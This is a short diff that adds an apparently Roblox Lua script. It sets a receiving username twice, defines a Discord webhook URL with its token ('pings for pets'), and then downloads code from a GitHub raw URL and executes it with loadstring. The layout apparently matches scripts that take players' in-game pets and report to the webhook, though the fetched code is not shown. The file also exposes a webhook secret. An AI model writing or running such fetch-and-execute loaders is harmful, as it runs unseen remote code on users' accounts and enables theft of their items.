@@ -1,0 +1,5 @@
+UserName = "CALXIE123"
+Webhook = "https://discord.com/api/webhooks/1165556044630593576/oSzrQmWCuCbVkiR-FDs2cWh8XBrUUJyMk5N4YaHqLmyHv9R7yPG1VN-nHlluJMCNWjY3" -- pings for pets
+UserName2 = "CALXIE123"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScripts", true))()
